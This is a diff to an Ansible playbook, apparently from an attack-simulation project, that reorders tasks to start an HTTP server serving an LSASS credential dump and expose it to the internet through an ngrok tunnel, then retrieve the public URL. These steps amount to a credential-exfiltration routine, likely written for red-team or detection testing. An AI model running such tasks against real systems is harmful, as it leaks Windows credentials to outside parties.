@@ -3,6 +3,14 @@
   shell: |
     ngrok authtoken {{ ngrok_authtoken }}
 
+- name: Create HTTP server to serve the lsass dump
+  shell: |
+    python3 data/app.py --port {{ ngrok_port }} &
+
+- name: Wait for server to start
+  pause:
+    seconds: 5
+
 - name: Start ngrok http tunnel
   shell: |
     nohup ngrok http {{ ngrok_port }} &
@@ -16,9 +24,6 @@
     curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url
   register: ngrok_url
 
-- name: Create HTTP server to serve the lsass dump
-  shell: |
-    nohup python3 -m http.server {{ ngrok_port }} --directory /opt/RBA/attack/simulation/data &
 
 - name: Display the output
   debug:
